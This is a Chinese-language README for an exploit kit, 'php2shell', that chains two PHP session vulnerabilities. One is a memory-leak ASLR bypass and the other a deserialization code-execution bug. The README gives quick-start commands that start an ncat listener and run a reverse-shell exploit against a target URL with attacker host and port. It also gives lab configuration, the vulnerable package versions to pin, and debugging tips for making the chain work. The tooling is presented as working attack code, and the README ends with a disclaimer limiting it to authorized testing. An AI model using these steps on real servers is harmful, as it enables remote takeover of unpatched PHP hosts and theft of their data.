# php2shell

PHP **session 机制**里两个 2026 年公布的高危漏洞的可复现利用。

| CVE | 根因 | 提供什么 |
|---|---|---|
| [CVE-2026-109618](cve-2026-109618/) | OOM 使 `longjmp` 跳过初始化，请求状态半初始化后仍被消费 | **纯 HTTP 的 ASLR 绕过**（chunk 基址 + libphp 基址） |
| [CVE-2026-109619](cve-2026-109619/) | `php` / `php_serialize` 序列化器不一致 | **代码执行原语**（反序列化 → `__destruct`） |

修复版本：**8.2.35 / 8.3.36 / 8.4.27 / 8.5.12**。8.1 及更早已 EOL，不会修。

---

## 为什么这两个漏洞值得放在一起

它们是**互补**的，不是重复的：

```
109618  →  泄漏 chunk 基址 + libphp 基址    （绕过 ASLR）
109619  →  反序列化 → __destruct → 任意调用  （执行）
```

109619 单独用不需要 ASLR 信息（因为 `__destruct` 里调的是 `system()`
这种现成函数）。但**当目标里没有合适的 gadget 类时**，109618 泄漏出的地址
就可以用来伪造一个。

反过来，109618 单独用只能泄漏 —— 它自己的 Stage3（伪造 `pDestructor`）
在本仓库测试的构建上没有走通，原因见该目录的 README 第 6 节。

---

## 共同点：都只需要 HTTP，webroot 全程为空

两条链都不依赖任何应用代码被写进 webroot：

- **109619** 利用 `session.upload_progress` 让攻击者控制 session **变量的名字**，
  PHP 自己把那个名字原样写进 session 文件，再被 `php_serialize` 整个反序列化。
- **109618** 利用 OOM 让 `PS(id)` 变成悬垂指针，再用 forge 的伪 `len`
  越界读。同样不需要写任何文件。

这大概是它们最值得注意的地方：**攻击者不再需要"上传一个 webshell"了。**

---

## 快速开始

```bash
# 拿到 shell（CVE-2026-109619）
sudo bash target/01_setup_lab.sh 8.4 8080 109619
ncat -lvnp 4444
python3 cve-2026-109619/exploit/02_revshell.py \
    -u http://<target-ip>:8080 --lhost <attacker-ip> --lport 4444

# 泄漏 chunk + libphp 基址（CVE-2026-109618）
sudo bash target/01_setup_lab.sh 8.4 8080 109618
python3 cve-2026-109618/exploit/run_all.py --target <target-ip> --port 8080
```

第三个参数（`109618` / `109619`）只有一件事：设置
`session.upload_progress.cleanup`。原因见下面「`cleanup` 冲突」一节。

### 本仓库测试过的环境

| 项 | 值 |
|---|---|
| OS | Debian 13 (trixie) |
| PHP | **发行版官方包** `php8.4 8.4.26-1~deb13u1`（低于修复版 8.4.27） |
| SAPI | Apache `mod_php`，`mpm_prefork`，单 worker |

**用发行版包而不是自编译**，因为真实目标就是这样。Debian 仓库的候选版
通常已经修好，所以要从官方 pool 取旧版本，并且 `apt-mark hold` 住
（否则一次 `apt-get -f install` 就会把它升回去）。

自编译的 PHP 也能跑，但**符号偏移完全不同** —— 每个目录的 README 里都有重取方法。

---

## `cleanup` 冲突：两条链需要相反的值

`session.upload_progress.cleanup` 是唯一一个两条链要求**相反**的设置：

| 值 | 效果 | 谁需要 |
|---|---|---|
| `Off` | 进度条目（它的**名字**就是 payload）活到 session 落盘 | 109619 的写侧 |
| `On` | END 事件走 `php_session_rfc1867_cleanup()` → `php_session_initialize()` → `php_session_reset_id()`，才会用悬垂的 `PS(id)` 发出 `Set-Cookie` | 109618 的 Stage 1 |

我一开始把两条链都配成 `Off`，结果 109618 一直 `no Set-Cookie` ——
因为它走的是 END 的 `update` 分支，根本不调 `session_initialize`。
靶机脚本的第三个参数就是用来切这个的。

---

## 靶机配置里三行不能删的

```ini
output_buffering = Off     ; 109618 Stage1 的开关
implicit_flush   = On      ;
max_input_vars   = 1000    ; 触发 109618 需要的警告
```

`output_buffering` 的作用不是性能调优 —— `php_request_startup()` 阶段的警告
只写进输出缓冲，**不置位 `SG(headers_sent)`**。不关它，109618 的
`php_session_send_cookie()` 永远不会失败，`PS(send_cookie)` 就被正常清零，
整条链的前提消失。

副作用是 109619 的读侧会报 `Session cannot be started after headers have
already been sent`，所以 `apache.conf` 里给 `/serialized/` **单独**把缓冲打开：

```apache
<Directory .../serialized>
    php_value output_buffering 4096
    php_value implicit_flush 0
</Directory>
```

---

## 目录

```
php2shell/
├── target/
│   ├── 01_setup_lab.sh          # 两条链共用的靶机（幂等）
│   └── lab/
│       ├── apache.conf          # 模板，@PORT@/@APP@/@WEBROOT@ 会被替换
│       ├── php.ini
│       ├── gadget.php           # 真实目标上这是框架自带的类
│       ├── bootstrap.php
│       ├── handler.php
│       └── serialized_index.php # php_serialize 读侧
├── cve-2026-109618/
│   ├── exploit/
│   │   ├── run_all.py           # 一键：chunk 基址 + libphp 基址
│   │   ├── 01_stage1_a_poison.py
│   │   └── 01_stage1_b_chunkleak.py
│   └── verify/read_psid.sh      # 白盒：读活 worker 的 ps_globals
└── cve-2026-109619/
    └── exploit/
        ├── 02_revshell.py                     # 反向 shell
        └── 01_session_serializer_mismatch.py  # 只写证明文件
```

---

## 调试时最容易浪费时间的几件事

| 现象 | 根因 |
|---|---|
| 利用"没生效"，证明文件找不到 | **Apache 常带 `PrivateTmp=yes`**。去 `/proc/<worker-pid>/root/tmp/` 找，不在宿主机的 `/tmp` |
| gdb 读出的结构全错位 | `ps_globals.id - 0x10` 会按 `sizeof(zend_string)=24` 换算成 `-0x180`。必须写 `(char*)ps_globals.id - 0x10` |
| attach 上了但读到全 0 | `www-data` 下还有 `htcacheclean` 也加载了 libphp。要用 `grep -q libphp8.4.so /proc/$p/maps` 过滤 |
| `__destruct` 不执行 | 序列化长度前缀写错（`s:9` vs 一个 10 字节的命令） |
| 复现隔天失效 | 包被 `apt-get -f install` 升回修复版。`apt-mark hold` |
| 只降级 `mod_php` 后 Apache 起不来 | `opcache` / `readline` 也必须同版本 |
| 越界读只读到同页的字符串 | Zend MM 按 bin 分页。要把 `len` 放大到 64KB 才跨得过去 |

---

## 免责声明

仅供授权的安全测试与漏洞研究。所有脚本默认指向 `127.0.0.1`。
